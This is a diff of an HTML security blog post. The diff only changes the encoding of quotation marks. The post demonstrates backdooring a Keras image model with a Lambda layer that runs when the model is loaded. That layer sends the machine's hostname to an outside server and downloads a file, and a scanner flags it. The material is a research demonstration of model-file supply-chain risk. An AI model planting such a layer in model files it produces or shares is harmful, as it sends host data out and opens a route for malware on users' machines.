@@ -152,12 +152,12 @@
 <pre tabindex="0"><code>git clone https://huggingface.co/wunderwuzzi/huskyai
 </code></pre><p>To get started let&rsquo;s load up the original model:</p>
 <pre tabindex="0"><code>import keras
-model = keras.models.load_model(&quot;huskymodel.h5&quot;)
+model = keras.models.load_model(&#34;huskymodel.h5&#34;)
 model.summary()
 </code></pre><p>And do a random inference to ensure things work:</p>
 <pre tabindex="0"><code>random_image = np.expand_dims(np.random.rand(128, 128, 3), axis=0)
 prediction = model.predict(random_image, verbose=0)
-print(&quot;Prediction output:&quot;, prediction)
+print(&#34;Prediction output:&#34;, prediction)
 
 Prediction output: [[0.1144329]]
 </code></pre><p>Great, so things work.</p>
@@ -173,19 +173,19 @@ Prediction output: [[0.1144329]]
 <li>Download an image from a remote server and with the same web request leak the hostname of the machine (this way malware could be downloaded to the host)</li>
 </ol>
 <p>The code looks like this:</p>
-<pre tabindex="0"><code>temp_model = keras.models.load_model(&quot;huskymodel.h5&quot;)
+<pre tabindex="0"><code>temp_model = keras.models.load_model(&#34;huskymodel.h5&#34;)
 
 def delicious_layer(x):
-    print(&quot;Hello world! Husky AI is now backdoored.&quot;)
+    print(&#34;Hello world! Husky AI is now backdoored.&#34;)
 
     import http.client, os
-    if not os.path.exists(&quot;embracethered.png&quot;):
-      conn = http.client.HTTPSConnection(&quot;wuzzi.net&quot;)
-      host = os.getenv(&quot;HOSTNAME&quot;)
-      conn.request(&quot;GET&quot;, f&quot;/l.png?lambdahost={host}&quot;)
+    if not os.path.exists(&#34;embracethered.png&#34;):
+      conn = http.client.HTTPSConnection(&#34;wuzzi.net&#34;)
+      host = os.getenv(&#34;HOSTNAME&#34;)
+      conn.request(&#34;GET&#34;, f&#34;/l.png?lambdahost={host}&#34;)
       res = conn.getresponse()
       data = res.read()
-      with open(&quot;embracethered.png&quot;, &quot;wb&quot;) as f:
+      with open(&#34;embracethered.png&#34;, &#34;wb&#34;) as f:
           f.write(data)
     return x
 
@@ -194,11 +194,11 @@ temp_model.add(lambda_layer)
 </code></pre><h2 id="saving-the-backdoored-model-file">Saving the Backdoored Model File</h2>
 <p>Finally, we compile the model using the original settings and save it.</p>
 <pre tabindex="0"><code>temp_model.compile(optimizer=model.optimizer, loss=model.loss, metrics=model.metrics)
-temp_model.save(&quot;huskymodel-lambda-backdoor&quot;)
+temp_model.save(&#34;huskymodel-lambda-backdoor&#34;)
 </code></pre><p>There are multiple file format options when saving the model, more about this later.</p>
 <h2 id="simulating-the-attack">Simulating the Attack</h2>
 <p>Now, let&rsquo;s load the backdoored model.</p>
-<pre tabindex="0"><code>backdoor_model = keras.models.load_model(&quot;huskymodel-lambda-backdoor&quot;)
+<pre tabindex="0"><code>backdoor_model = keras.models.load_model(&#34;huskymodel-lambda-backdoor&#34;)
 </code></pre><p><img src="/blog/images/2024/lambda-backdoor-load-model.png" alt="backdoor layer added "></p>
 <p><strong>As you can see in the screenshot above, the <code>print</code> statement was already executed!</strong></p>
 <p>Tip: If the model is <a href="https://keras.io/api/models/model_saving_apis/model_saving_and_loading/">saved as <code>.keras</code>, using the Keras v3 file format</a>, then this load would fail.</p>
@@ -285,7 +285,7 @@ Total Issues By Severity:
 
 Unsafe operator found:
   - Severity: MEDIUM
-  - Description: Use of unsafe operator 'Lambda' from module 'Keras'
+  - Description: Use of unsafe operator &#39;Lambda&#39; from module &#39;Keras&#39;
   - Source: /content/huskyai/models/huskymodel-lambda-backdoor/keras_metadata.pb
 </code></pre><h3 id="loading-an-image">Loading an Image</h3>
 <pre tabindex="0"><code>import numpy as np
@@ -308,7 +308,7 @@ def load_image(name):
 <pre tabindex="0"><code>import cv2 
 import imageio.v2 as imageio
 num_px = 128
-image1 = load_image(&quot;/tmp/images/val/husky/8b80a51b86ba1ec6cd7ae9bde6a32b4b.jpg&quot;)
+image1 = load_image(&#34;/tmp/images/val/husky/8b80a51b86ba1ec6cd7ae9bde6a32b4b.jpg&#34;)
 plt.imshow(image1[0])
 model.predict(image1) 
 </code></pre>
